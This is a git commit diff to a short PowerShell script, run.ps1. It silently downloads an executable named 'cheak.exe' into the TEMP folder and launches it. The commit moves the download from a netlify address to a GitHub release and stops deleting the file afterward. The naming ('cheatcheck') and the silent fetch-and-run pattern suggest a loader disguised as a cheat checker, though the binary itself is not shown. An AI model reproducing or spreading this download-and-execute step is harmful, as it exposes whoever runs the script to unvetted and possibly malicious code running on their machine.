9cf544164edfbd0328124a1b76b7f1411444558a
tibizda068-collab <tibizda068@gmail.com>
2026-06-15 23:43:33 +0300

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,6 +1,5 @@
 [Net.ServicePointManager]::SecurityProtocol = 3072
 \(ProgressPreference = 'SilentlyContinue'
 
-irm https://cheatcheck.netlify.app/cheak.exe -OutFile \)env:TEMP\c.exe
-Start-Process \(env:TEMP\c.exe
-Remove-Item \)env:TEMP\c.exe
+irm https://github.com/tibizda068-collab/sbs/releases/download/v1/cheak.exe -OutFile \)env:TEMP\c.exe
+Start-Process $env:TEMP\c.exe
